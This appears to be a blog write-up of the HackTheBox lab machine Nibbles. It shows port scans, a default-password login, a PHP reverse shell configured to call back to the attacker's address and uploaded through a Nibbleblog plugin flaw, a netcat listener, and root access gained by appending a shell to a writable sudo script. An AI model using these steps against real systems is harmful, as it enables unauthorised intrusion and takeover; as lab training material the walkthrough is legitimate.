---
layout: page
title: Nibbles
description: Nibbles from HackTheBox.
img: 
importance: 4
category: HackTheBox
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="assets/img/nibbles/logo.png" title="HTB Nibbles Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
<h2>Link</h2>
<a href="https://app.hackthebox.com/Nibbles">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Taking a nibble out of a vulnerable blog!

Let's run an nmap scan to check for open ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/nibbles]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.10.75
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 00:07 AEDT
Nmap scan report for 10.10.10.75
Host is up (0.022s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   10.90 ms 10.10.16.1
2   59.41 ms 10.10.10.75

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.83 seconds
```
{% endraw %}

<br />
Run a second nmap scan looking for any unusual ports.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/nibbles]
└─$ sudo nmap -sS -p- -oN nmapfull 10.10.10.75  
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-20 00:08 AEDT
Nmap scan report for 10.10.10.75
Host is up (0.013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.54 seconds
```
{% endraw %}

<br />
View the landing page and check the source.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/nibbles/landing.png" title="Check the Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

{% raw %}
```sh
view-source:http://10.10.10.75/

<b>Hello world!</b>














<!-- /nibbleblog/ directory. Nothing interesting here! -->
```
{% endraw %}

<br />
Check out the /nibbleblog/ directory.  There might be nothing interesting here but always good to double-check.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/nibbles/nibbleblog.png" title="Check the Nibbleblog" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the README file and get the version number.

{% raw %}
```sh
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01

<snip>
```
{% endraw %}

<br />
Navigate to the admin section of the blog.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/nibbles/admin.png" title="Check the Admin Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try admin:admin and try to login.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/nibbles/failed.png" title="Try to Login" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Try admin:nibbles (the name of the box) and try to login again.

<br />
Try admin:admin and try to login.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/nibbles/blog.png" title="Blog" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Research nibbleblog and come across this repo with an exploit.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/nibbles/repo.png" title="Exploit Repository" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://github.com/dix0nym/CVE-2015-6967">Repository</a>

<br />
Download the pentestmonkey reverse php shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/nibbles]
└─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php
--2025-01-20 00:31:48--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 2606:50c0:8000::154, 2606:50c0:8001::154, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [text/plain]
Saving to: ‘shell.php’

shell.php                                                  100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0s      

2025-01-20 00:31:48 (54.6 MB/s) - ‘shell.php’ saved [5491/5491]
```
{% endraw %}

<br />
Update the code to use the HackTheBox IP and the attack listening port.

{% raw %}
```php
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.

<snip>

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.10.16.3';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

<snip>

?>
```
{% endraw %}

<br />
Reading through the exploit, it turns out that the My image plugin doesn't do an extension check when uploading and "image."

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/nibbles/myimage.png" title="My image plugin" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Click on Browse and double-click the PTM shell.php file from earlier.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/nibbles/findfile.png" title="Choose shell.php" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Save the changes.

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/nibbles/save.png" title="Click the Save button" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Start a netcat listener.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/nibbles]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...

<snip>
```
{% endraw %}

<br />
Navigate to the new "image" in the web browser.

<div class="row justify-content-sm-center">
    <div class="col-sm-8 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/nibbles/newimage.png" title="Navigate to the New Image" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the listener and catch the shell.  Use python to upgrade the shell.

{% raw %}
```sh
┌──(kali㉿kali)-[~/Documents/htb/nibbles]
└─$ sudo nc -nlvp 443
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.3] from (UNKNOWN) [10.10.10.75] 48864
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 08:43:19 up 38 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ python -c 'import pty; pty.spawn("/bin/bash")'
/bin/sh: 1: python: not found
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
nibbler@Nibbles:
```
{% endraw %}

<br />
Run sudo -l to see a list of command that this user can run as sudo.

{% raw %}
```sh
nibbler@Nibbles:/$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```sh
nibbler@Nibbles:/home/nibbler$ cat user.txt
cat user.txt
<redacted>
nibbler@Nibbles:/home/nibbler$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:1d:9a brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.75/24 brd 10.10.10.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:1d9a/64 scope global mngtmpaddr dynamic 
       valid_lft 86400sec preferred_lft 14400sec
    inet6 fe80::250:56ff:feb9:1d9a/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Unzip the personal.zip archive.

{% raw %}
```sh
nibbler@Nibbles:/home/nibbler$ unzip personal.zip
unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh
```
{% endraw %}

<br />
Check the permissions of monitor.sh.  Turn out we can modify the file.  Most excellent.

{% raw %}
```sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ ls -la
ls -la
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
```
{% endraw %}

<br />
Echo /bin/bash into the monitor.sh file.

{% raw %}
```sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo '/bin/bash' >> monitor.sh
echo '/bin/bash' >> monitor.sh
```
{% endraw %}

<br />
Run the monitor.sh file with the sudo.

{% raw %}
```sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
<er/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh             
'unknown': I need something more specific.
/home/nibbler/personal/stuff/monitor.sh: 26: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 36: /home/nibbler/personal/stuff/monitor.sh: [[: not found
/home/nibbler/personal/stuff/monitor.sh: 43: /home/nibbler/personal/stuff/monitor.sh: [[: not found
root@Nibbles:/home/nibbler/personal/stuff#
```
{% endraw %}

<br />
Run the whoami to confirm root.

{% raw %}
```sh
root@Nibbles:/home/nibbler/personal/stuff# whoami
whoami
root
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```sh
root@Nibbles:/home/nibbler/personal/stuff# cat /root/root.txt
cat /root/root.txt
<redacted>
root@Nibbles:/home/nibbler/personal/stuff# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b9:1d:9a brd ff:ff:ff:ff:ff:ff
    inet 10.10.10.75/24 brd 10.10.10.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 dead:beef::250:56ff:feb9:1d9a/64 scope global mngtmpaddr dynamic 
       valid_lft 86399sec preferred_lft 14399sec
    inet6 fe80::250:56ff:feb9:1d9a/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Looks like we got more than a nibble.  We got the whole machine.